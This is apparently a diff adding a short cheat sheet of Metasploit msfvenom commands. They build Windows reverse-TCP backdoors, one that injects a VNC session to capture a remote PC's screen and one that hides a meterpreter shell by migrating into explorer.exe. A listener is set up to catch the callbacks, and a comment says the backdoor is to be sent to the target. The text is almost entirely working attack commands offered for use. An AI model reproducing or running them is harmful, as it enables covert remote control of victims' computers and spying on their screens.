@@ -1,0 +1,13 @@
+Capture VNC Session of Remote PC using Msfvenom:
+
+msfvenom –p windows/vncinject/reverse_tcp lhost=192.168.1.15 lport=4444 –f exe > /root/Desktop/vnc.exe
+# Being an attack you need to send this backdoor to the target and start multi handler in the Metasploit framework
+use multi/handler
+msf exploit(handler) > set payload windows/vncinject/reverse_tcp
+msf exploit(handler) > set lhost 192.168.1.15
+msf exploit(handler) > set lport 4444
+msf exploit(handler) > exploit
+-------------------------------------------------------------------------------------------------------------------
+Hiding Shell with Prepend Migrate using Msfvenom
+
+msfvenom –p windows/meterpreter/reverse_tcp lhost=192.168.1.104 lport=5555 prependmigrate=true prepenmigrateprocess=explorer.exe –f exe > /root/Desktop/raj.exe
